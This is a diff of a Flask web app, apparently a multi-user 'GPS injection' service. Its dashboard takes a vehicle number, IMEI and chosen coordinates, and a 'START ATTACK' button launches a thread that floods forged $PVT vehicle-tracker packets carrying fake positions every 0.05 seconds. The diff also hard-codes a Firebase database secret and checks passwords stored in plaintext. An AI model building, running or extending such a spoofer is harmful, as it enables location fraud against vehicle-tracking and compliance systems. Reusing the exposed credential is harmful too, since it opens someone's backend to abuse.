@@ -3,9 +3,8 @@ from datetime import datetime, timedelta, timezone
 from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
 
 app = Flask(__name__)
-app.secret_key = "nitro_v82_hybrid_ultimate_fix_final"
+app.secret_key = "nitro_v82_hybrid_ultimate_2026"
 
-# --- FIREBASE CONFIG ---
 FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
 FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"
 
@@ -18,8 +17,8 @@ user_sessions = {}
 def get_ist_time():
     return datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
 
-# --- DASHBOARD HTML (FIXED UI & STRIP) ---
-DASH_HTML = """
+# --- FULL HTML UI ---
+UI_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
@@ -27,25 +26,27 @@ DASH_HTML = """
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; display: flex; flex-direction: column; align-items: center; }
-        .score-bar { background: #050505; border: 1px solid #0f0; width: 100%; max-width: 480px; padding: 10px; border-radius: 10px; display: flex; justify-content: space-around; font-size: 11px; margin-bottom: 10px; box-shadow: 0 0 10px #0f0; }
-        .s-val { color: #fff; font-weight: bold; }
-        .header { width: 100%; max-width: 480px; display: flex; justify-content: space-between; padding: 5px; font-size: 12px; margin-bottom: 5px; }
-        .box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; width: 100%; max-width: 480px; background: #050505; box-shadow: 0 0 20px #0f0; }
-        #map { height: 180px; width: 100%; border: 1px solid #0f0; border-radius: 10px; margin-bottom: 10px; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 5px; display: flex; flex-direction: column; align-items: center; }
+        .strip { width: 100%; max-width: 480px; background: #050505; border: 1px solid #0f0; padding: 10px; border-radius: 8px; display: flex; justify-content: space-around; font-size: 10px; margin-bottom: 5px; box-shadow: 0 0 10px #0f0; }
+        .header { width: 100%; max-width: 480px; display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #333; margin-bottom: 10px; }
+        .box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; width: 95%; max-width: 450px; background: #050505; box-shadow: 0 0 20px #0f0; }
+        #map { height: 180px; width: 100%; border-radius: 10px; margin-bottom: 10px; border: 1px solid #0f0; }
         .metric { font-size: 50px; color: #fff; text-align: center; margin: 10px 0; font-weight: bold; }
         input { width: 92%; padding: 12px; margin: 5px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; font-weight: bold; }
-        .btn { padding: 15px; font-size: 16px; width: 100%; font-weight: bold; text-transform: uppercase; margin-top: 10px; cursor: pointer; border-radius: 8px; border: none; }
+        .btn { padding: 15px; font-size: 16px; width: 100%; font-weight: bold; margin-top: 10px; cursor: pointer; border-radius: 8px; border: none; }
         .start { background: #008000; color: #fff; } .stop { background: #800; color: #fff; } .reset { background: #333; color: #fff; }
-        .preview { background: #111; color: yellow; padding: 10px; font-size: 10px; word-break: break-all; margin-top: 10px; border: 1px dashed #0f0; min-height: 60px; }
+        .preview { background: #111; color: yellow; padding: 10px; font-size: 10px; word-break: break-all; margin-top: 10px; border: 1px dashed #0f0; min-height: 50px; }
     </style>
 </head>
 <body>
-    <div class="header"><span>ID: {{user_id}}</span><a href="/logout" style="color:red">LOGOUT</a></div>
-    <div class="score-bar">
-        <span>TOTAL: <span id="s_total" class="s-val">0</span></span>
-        <span>SUCCESS: <span id="s_ok" class="s-val" style="color:#0f0">0</span></span>
-        <span>FAIL: <span id="s_fail" class="s-val" style="color:#f00">0</span></span>
+    <div class="strip">
+        <span>TOTAL: <span id="s_total">0</span></span>
+        <span style="color:#0f0">OK: <span id="s_ok">0</span></span>
+        <span style="color:#f00">FAIL: <span id="s_fail">0</span></span>
+    </div>
+    <div class="header">
+        <span>USER ID: {{user_id}}</span>
+        <a href="/logout" style="color:red; text-decoration:none;">[ LOGOUT ]</a>
     </div>
     <div class="box">
         <div id="map"></div>
@@ -57,8 +58,8 @@ DASH_HTML = """
                 <input type="text" name="lat" id="lat" value="{{status.lat}}">
                 <input type="text" name="lon" id="lon" value="{{status.lon}}">
             </div>
-            <div class="preview" id="preview">Ready...</div>
-            <button class="btn start" name="btn" value="start">🚀 START HYBRID ENGINE</button>
+            <div class="preview" id="preview">{{status.last_pkt}}</div>
+            <button class="btn start" name="btn" value="start">🚀 START ATTACK</button>
             <button class="btn stop" name="btn" value="stop">🛑 STOP</button>
             <button class="btn reset" name="btn" value="reset">🔄 RESET</button>
         </form>
@@ -69,11 +70,9 @@ DASH_HTML = """
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
         var marker = L.marker([{{status.lat}}, {{status.lon}}]).addTo(map);
 
-        // IMEI FETCH FROM DATA_RECORDS
         document.getElementById('vno').addEventListener('blur', function() {
             fetch('/check_vehicle?vno=' + this.value)
-            .then(r => r.json())
-            .then(d => { if(d.imei) document.getElementById('imei').value = d.imei; });
+            .then(r => r.json()).then(d => { if(d.imei) document.getElementById('imei').value = d.imei; });
         });
 
         setInterval(() => {
@@ -92,7 +91,12 @@ DASH_HTML = """
 </html>
 """
 
-# --- BACKEND LOGIC (FIXED ENDPOINTS) ---
+# --- BACKEND LOGIC ---
+@app.route('/logout')
+def logout():
+    session.clear()
+    return redirect(url_for('login'))
+
 @app.route('/check_vehicle')
 def check_vehicle():
     vno = request.args.get('vno', '').upper()
@@ -108,16 +112,29 @@ def data():
         user_sessions[sid]['score'] = score if score else {}
     return jsonify(user_sessions.get(sid, {}))
 
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        uid, pw = request.form.get('userid'), request.form.get('password')
+        u_data = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}").json()
+        if u_data and str(u_data.get('password')) == str(pw):
+            session['user'], sid = uid, str(uuid.uuid4())
+            session['device_sid'] = sid
+            user_sessions[sid] = {"uid":uid, "firing":False, "count":0, "imei":"", "vno":"", "lat":str(u_data.get('lat', "25.2988")), "lon":str(u_data.get('lon', "84.6510")), "last_pkt":"Ready..."}
+            return redirect(url_for('dashboard'))
+    return render_template_string("LOGIN_HTML_CONTENT_HERE") # Apni purani login HTML paste kar dena
+
+@app.route('/dashboard')
+def dashboard():
+    uid, sid = session.get('user'), session.get('device_sid')
+    if not uid or sid not in user_sessions: return redirect(url_for('login'))
+    return render_template_string(UI_HTML, user_id=uid, status=user_sessions[sid])
+
 @app.route('/action', methods=['POST'])
 def action():
-    sid = session.get('device_sid')
-    val = request.form.get('btn')
+    sid, val = session.get('device_sid'), request.form.get('btn')
     if val == "start":
-        user_sessions[sid].update({
-            "firing": True, "imei": request.form.get('imei'),
-            "vno": request.form.get('vno').upper(),
-            "lat": request.form.get('lat'), "lon": request.form.get('lon')
-        })
+        user_sessions[sid].update({"firing":True, "imei":request.form.get('imei'), "vno":request.form.get('vno').upper(), "lat":request.form.get('lat'), "lon":request.form.get('lon')})
         threading.Thread(target=firing_engine, args=(sid,), daemon=True).start()
     elif val == "stop": user_sessions[sid]["firing"] = False
     elif val == "reset": user_sessions[sid].update({"firing":False, "count":0, "imei":"", "vno":""})
@@ -130,7 +147,6 @@ def firing_engine(sid):
             s = user_sessions[sid]
             tag = TAG_LIST[s["count"] % len(TAG_LIST)]
             dt = get_ist_time().strftime("%d%m%Y,%H%M%S")
-            # Hybrid String with Termination Point 3
             pkt = f"$PVT,{tag},2.1.1,NR,01,L,{s['imei']},{s['vno']},1,{dt},{s['lat']},N,{s['lon']},E,{NEW_SUFFIX},{FIXED_CS}*"
             payload = pkt + " \r \n "
             user_sessions[sid]["last_pkt"] = pkt
@@ -141,4 +157,5 @@ def firing_engine(sid):
             time.sleep(0.05)
         except: time.sleep(1)
 
-# (Login route same rahega...)
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=5000)
